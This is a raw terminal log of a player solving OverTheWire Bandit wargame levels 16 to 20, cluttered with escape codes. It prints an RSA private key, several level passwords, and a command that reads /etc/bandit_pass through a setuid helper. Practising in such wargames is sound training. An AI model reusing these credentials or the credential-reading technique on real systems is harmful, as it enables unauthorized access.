[4dSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A[5dR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi[6dTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg[7dR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu[8dL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni[9dblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU[10dYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM[11d77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b[12ddxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3[13dvBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=[14d-----END RSA PRIVATE KEY-----[15d[?12l[?25h[?25l[?12l[?25hx[?25l[?12l[?25hy[?25l[16d[?12l[?25h[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[30d(B[0;7m^G(B[m Help[30;19H(B[0;7mM-D(B[m DOS Format    (B[0;7mM-A(B[m Append[30;55H(B[0;7mM-B(B[m Backup File[31d(B[0;7m^C(B[m Cancel[17G  (B[0;7mM-M(B[m Mac Format    (B[0;7mM-P(B[m Prepend[55G(B[0;7m^T(B[m Browse[29d(B[0;7mFile Name to Write: bandit17p.key(B[m[?12l[?25h[?25l[29G[1K (B[0;7m[ Cancelled ](B[m[K[30;15H(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[55G  (B[0;7m^T(B[m Execute[K[31;2H(B[0;7mX(B[m Exit       (B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste      (B[0;7m^J(B[m Justify[?12l[?25h[16d[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[J[31d[?12l[?25h[31;1H[?1049l[23;0;0t[?1l>[?2004lUnable to create directory /home/bandit16/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+[?2004h]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ [?2004l
+logout
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ nano 17.p[K[Kpr.key
+[?2004l[?2004h[?1049h[22;0;0t[1;31r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[29;31H(B[0;7m[ New File ](B[m[H(B[0;7m  GNU nano 7.2                    17pr.key                              [1;71H(B[m[30d(B[0;7m^H(B[m Help[15G(B[0;7m^O(B[m Read File  (B[0;7m^R(B[m Replace    (B[0;7m^V(B[m Paste[57G(B[0;7m^G(B[m Go To Line[31d(B[0;7m^X(B[m Exit[15G(B[0;7m^F(B[m Where Is   (B[0;7m^K(B[m Cut[31;43H(B[0;7m^T(B[m Execute    (B[0;7m^Z(B[m Undo[2d[?12l[?25h[?25l[1;63H(B[0;7mModified[29d(B[m[K[1;71H[29;6H(B[0;7m[ line 28/28 (100%), col  1/ 1 (100%), char 1675/1675 (100%) ](B[m[2dSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd[3dHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt[4dSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A[5dR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi[6dTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg[7dR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu[8dL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni[9dblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU[10dYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM[11d77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b[12ddxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3[13dvBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=[14d-----END RSA PRIVATE KEY-----[15d[?12l[?25h[?25l[29;14H(B[0;7m9/29[29;53H6/1676[68G(B[m[16d[?12l[?25h[?25l[29;6H (B[0;7m[ line 23/29 (79[29;34H65 (  1[29;51H397[61G83%) ](B[m[K[?12l[?25h[10d[?25l[29;14H(B[0;7m17/29 (58[29;51H00[29;61H60%) ](B[m[?12l[?25h[4d[?25l[29;15H(B[0;7m1/29 (37[29;50H 61[29;61H36%) ](B[m[?12l[?25h[2;28r[2;1H[4T[1;31r[2;1HYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A[3dvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama[4d+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT[5d8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx[2d[?25l[29;14H(B[0;7m 9[22G1[29;51H48[29;61H29%) ](B[m[?12l[?25h[2;28r[2;1H[2T[1;31r[2;1HJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd[3dd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC[A[?25l[29;15H(B[0;7m7/29 (24[29;51H35[29;62H1%) ](B[m[?12l[?25h[2;28r[2;1H[2T[1;31r[2;1Hx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD[3dKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl[A[?25l[29;15H(B[0;7m4/29 (13[29;51H162[61G 9%) ](B[m[?12l[?25h[2;28r[2;1H[3T[1;31r[2;1HJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu[3dDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW[4dJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX[2d[?25l[29;15H(B[0;7m1/29 ( [29;34H32 (  3[29;51H  0[29;62H0%) ](B[m[?12l[?25h[2;28r[2;1H[3T[1;31r[2;1H-----BEGIN RSA PRIVATE KEY-----[3dMIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ[4dimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ[2d[?25l[29;67H[?12l[?25h[2d[?25l[29;67H[?12l[?25h[2d[?25l[29;67H[?12l[?25h[2d[?25l[29;67H[?12l[?25h[2d[?25l[29;15H(B[0;7m3/29 (10[29;34H65 (  1[29;52H97[29;62H5%) ](B[m[?12l[?25h[4d[?25l[29;14H(B[0;7m10/29 (34[29;51H552[61G32%) ](B[m[?12l[?25h[11d[?25l[29;15H(B[0;7m5/29 (51[29;51H877[61G5[67G(B[m[?12l[?25h[16d[?25l[29;14H(B[0;7m22/29 (75[29;50H1332[61G79%) ](B[m[?12l[?25h[23d[?25l[29;15H(B[0;7m6/29 (89[29;34H53[29;51H59[29;61H94%) ](B[m[?12l[?25h[27d[?25l[29;6H(B[0;7m[ line 29/29 (100[29;34H 1 (100[29;51H676[61G100%) ](B[m[?12l[?25h[2;28r[28;1H[2S[1;31r[28;1H[?25l[29;68H[?12l[?25h[A[?25l[29;68H[?12l[?25h[A[?25l[29;68H[?12l[?25h[A[?25l[29;68H[?12l[?25h[A[?25l[29;68H[?12l[?25h[A[?25l[29;68H[?12l[?25h[A[?25l[29;68H[?12l[?25h[A[?25l[29;68H[?12l[?25h[A[?25l[29d(B[0;7mSave modified buffer?                                                   [30;1H Y(B[m Yes[K[31d(B[0;7m N(B[m No  [15G  (B[0;7m^C(B[m Cancel[K[29;23H[?12l[?25h[?25l[30d(B[0;7m^H(B[m Help[30;19H(B[0;7mM-D(B[m DOS Format    (B[0;7mM-A(B[m Append[30;55H(B[0;7mM-B(B[m Backup File[31d(B[0;7m^C(B[m Cancel[17G  (B[0;7mM-M(B[m Mac Format    (B[0;7mM-P(B[m Prepend[55G(B[0;7m^T(B[m Browse[29d(B[0;7mFile Name to Write: 17pr.key(B[m[?12l[?25h[?25l[1K (B[0;7m[ Writing... ](B[m[K[1;63H(B[0;7m        (B[m[29;28H(B[0;7m[ Wrote 28 lines ](B[m[J[31d[?12l[?25h[31;1H[?1049l[23;0;0t[?1l>[?2004l[?2004h[feizal@mzamilsaid--->~]$ chmod 400 17pr.key
+[?2004l[?2004h[feizal@mzamilsaid--->~]$ chmod 400 17pr.key[5Pnano[C[C[C[C[C[C[C[C[Cssh bandit16@bandit.labs.overthewire.org -p 2220[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C@bandit.labs.overthewire.org -p 2220[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C7@bandit.labs.overthewire.org -p 2220[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C bandit17@bandit.labs.overthewire.org -p 2220[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C- bandit17@bandit.labs.overthewire.org -p 2[C20[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ci bandit17@bandit.labs.overthewire.org -p [C[C20[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C bandit17@bandit.labs.overthewire.org -p 2220[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1 bandit17@bandit.labs.overthewire.org -p 2220[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C7 bandit17@bandit.labs.overthewire.org [1@-[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpr.key bandit17@bandit.labs.overthewir[6@e.org [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C bandit17@bandit.labs.overthewi[1@r[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit17@bandit: ~[01;32mbandit17@bandit[00m:[01;34m~[00m$ ls
+[?2004lpasswords.new  [0m[00;90mpasswords.old[0m
+[?2004h]0;bandit17@bandit: ~[01;32mbandit17@bandit[00m:[01;34m~[00m$ diff passwords.m[Kn [Kew d[Kpasswords.old 
+[?2004l42c42
+< x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
+---
+> bSrACvJvvBSxEM2SGsV5sn09vc3xgqyp
+[?2004h]0;bandit17@bandit: ~[01;32mbandit17@bandit[00m:[01;34m~[00m$ nan[K[?2004l
+logout
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ ssh -i 17pr.key  bandit17@bandit.labs.overthewire.org -p 2220[A[C[C[C[C[C[C[C[C[C[C[C[28Pchmod 400 17pr.key
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[5Pnano[C[C[C[C[C[C[C[C[Cssh bandit16@bandit.labs.overthewire.org -p 2220[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C@bandit.labs.overthewire.org -p 2220[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C8@bandit.labs.overthewire.org -p 2220[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+Byebye !
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 cat 'readme'
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org's password: 
+cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 cat 'readme'[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C@bandit.labs.overthewire.org -p 2220[1P[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C9@bandit.labs.overthewire.org -p 222[1@0[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit19@bandit.labs.overthewire.org's password: 
+cat: readme: No such file or directory
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit19@bandit.labs.overthewire.org -p 2220 cat 'readme'[K[K[K[K[K[K[K[K[K[K[K[K
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit19@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit19@bandit: ~[01;32mbandit19@bandit[00m:[01;34m~[00m$ ls
+[?2004l[0m[37;41mbandit20-do[0m
+[?2004h]0;bandit19@bandit: ~[01;32mbandit19@bandit[00m:[01;34m~[00m$ ./bandit20-do  cat /etc/bandit_pass/bandit20
+[?2004l0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+[?2004h]0;bandit19@bandit: ~[01;32mbandit19@bandit[00m:[01;34m~[00m$ [?2004l
+logout
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ ssh bandit19@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C@bandit.labs.overthewire.org -p 2220[1P [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C@bandit.labs.overthewire.org -p 2220 [K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C0@bandit.labs.overthewire.org -p 2220 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit20@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit20@bandit: ~[01;32mbandit20@bandit[00m:[01;34m~[00m$ ls
+[?2004l[0m[37;41msuconnect[0m
+[?2004h]0;bandit20@bandit: ~[01;32mbandit20@bandit[00m:[01;34m~[00m$ ./[K]0;bandit20@bandit: ~[01;32mbandit20@bandit[00m:[01;34m~[00m$ ./suconnect 
+[?2004lUsage: ./suconnect <portnumber>
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
